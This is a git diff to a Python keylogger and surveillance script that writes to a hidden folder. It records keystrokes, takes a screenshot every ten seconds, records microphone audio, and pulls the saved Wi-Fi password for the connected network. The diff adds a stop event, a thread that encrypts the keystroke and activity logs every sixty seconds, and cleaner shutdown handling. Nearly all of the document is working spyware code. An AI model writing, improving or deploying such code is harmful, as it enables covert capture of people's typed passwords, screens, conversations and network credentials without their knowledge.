@@ -10,6 +10,8 @@ from pynput import keyboard  # type: ignore
 from PIL import ImageGrab
 from cryptography.fernet import Fernet
 
+stop_event = threading.Event()
+
 
 # Creating log directory
 log_dir = "/Users/mannatvirk/.hiddenfolder"
@@ -31,11 +33,16 @@ operation_logger.addHandler(operation_handler)
 
 # generating key for encryption and decryption 
 key_file = os.path.join(log_dir, "encryption_key.key")
+print(f"log_dir: {log_dir}")
+
 if not os.path.exists(key_file):
+    print("Encryption key not found. Generating a new key...")
     key = Fernet.generate_key()
     with open(key_file, "wb") as f:
         f.write(key)
+    print("Encryption key generated and saved.")
 else:
+    print("Encryption key found.")
     with open(key_file, "rb") as f:
         key = f.read()
 
@@ -60,7 +67,7 @@ def take_screenshot():
 
 # continuously take screenshots 
 def periodic_screenshots(interval=10):
-    while True:
+    while not stop_event.is_set():
         take_screenshot()
         time.sleep(interval)
 
@@ -123,27 +130,19 @@ def get_wifi_password(ssid):
         logging.info(f"Unexpected error: {e}")
 
 def encrypt_file(filepath):
-    print(f"Checking if {filepath} exists...")
     try:
         if os.path.exists(filepath):
-            print(f"Encrypting {filepath}...")  # debug
+            print(f"Encrypting {filepath}...")
             with open(filepath, "rb") as f:
                 file_data = f.read()
-                if not file_data:
-                    operation_logger.info(f"File {filepath} is empty and will not be encrypted.")
-                    print(f"File {filepath} is empty; skipping encryption.")  # debug
-                    return
             encrypted_data = cipher.encrypt(file_data)
             with open(filepath, "wb") as f:
                 f.write(encrypted_data)
-            operation_logger.info(f"Encrypted {filepath} successfully.")
-            print(f"Encryption of {filepath} completed.")  # debuh
+            print(f"Encryption of {filepath} completed.")
         else:
-            operation_logger.info(f"File {filepath} does not exist.")
-            print(f"File {filepath} does not exist.")  # debug
+            print(f"File {filepath} does not exist.")
     except Exception as e:
-        operation_logger.info(f"Error encrypting {filepath}: {e}")
-        print(f"Error encrypting {filepath}: {e}")  # debug
+        print(f"Error encrypting {filepath}: {e}")
 
 def decrypt_file(filepath):
     try:
@@ -163,24 +162,35 @@ def decrypt_file(filepath):
         operation_logger.info(f"Error decrypting {filepath}: {e}")
         print(f"Error decrypting {filepath}: {e}")  # Debug statement
 
+#concurrent encryption
+def periodic_encryption(interval=60):
+    while not stop_event.is_set():
+        print("Starting periodic encryption...")
+        log_file_path = os.path.join(log_dir, "log.txt")
+        keylog_file_path = os.path.join(log_dir, "keylog.txt")
+        encrypt_file(log_file_path)
+        encrypt_file(keylog_file_path)
+        print("Finished periodic encryption.")
+        time.sleep(interval)
 
 if __name__ == "__main__":
     print("Starting main execution...")
-    
-    # Commenting out redirection for debugging
-    # sys.stdout = open(os.devnull, 'w')
-    # sys.stderr = open(os.devnull, 'w')
 
+    # screenshot thread start
     screenshot_thread = threading.Thread(target=periodic_screenshots, args=(10,), daemon=True)
     screenshot_thread.start()
-
     print("Started screenshot thread.")
 
+    # encryption thread start
+    encryption_thread = threading.Thread(target=periodic_encryption, args=(60,), daemon=True)  # Encrypt every 60 seconds
+    encryption_thread.start()
+    print("Started periodic encryption thread.")
+
+    # audio recording thread start
     audio_filename = os.path.join(log_dir, "audio_rec.wav")
     recording_duration = 300  
     audio_thread = threading.Thread(target=record_audio, args=(audio_filename, recording_duration), daemon=True)
     audio_thread.start()
-
     print("Started audio recording thread.")
 
     current_ssid = get_current_wifi_ssid()
@@ -191,18 +201,20 @@ if __name__ == "__main__":
         print("No connected Wi-Fi network found.")
         logging.info("No connected Wi-Fi network found.")
 
+    # keylogger start
     listener = keyboard.Listener(on_press=on_press)
     listener.start()
     print("Keylogger started.")
-    
-    listener.join()
-    print("Keylogger stopped.")
 
-    log_file_path = os.path.join(log_dir, "log.txt")
-    keylog_file_path = os.path.join(log_dir, "keylog.txt")
-    
-    print("Encrypting log files...")
-    encrypt_file(log_file_path)
-    encrypt_file(keylog_file_path)
+    try:
+        # keep main program running 
+        listener.join()
+    except KeyboardInterrupt:
+        print("Stopping all operations...")
 
-    print("Finished encryption process.")
+    # stopping and joining threads 
+    stop_event.set()
+    screenshot_thread.join()
+    encryption_thread.join()
+    audio_thread.join()
+    print("All threads stopped.")
